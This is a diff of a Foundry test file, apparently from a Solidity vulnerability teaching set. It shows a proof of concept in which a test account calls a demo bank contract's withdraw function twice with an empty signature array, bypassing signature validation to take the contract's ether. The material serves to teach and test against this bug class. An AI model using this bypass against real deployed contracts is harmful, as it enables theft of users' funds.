@@ -27,18 +27,18 @@ contract ContractTest is Test {
     }
 
     function testVulnSignatureValidation() public {
-        payable(address(SimpleBankContract)).transfer(10 ether);
         address alice = vm.addr(1);
-        vm.startPrank(alice);
-
-        SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input
-        //sigs[0] = SimpleBank.Signature("", 0, "", "");
-
+        payable(SimpleBankContract).transfer(2 ether);
         console.log(
             "Before exploiting, Alice's ether balance",
             address(alice).balance
         );
-        SimpleBankContract.withdraw(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter
+        SimpleBank.Signature[] memory sigs;
+
+        vm.prank(alice);
+        SimpleBankContract.withdraw(sigs);
+        vm.prank(alice);
+        SimpleBankContract.withdraw(sigs);
 
         console.log(
             "Afer exploiting, Alice's ether balance",
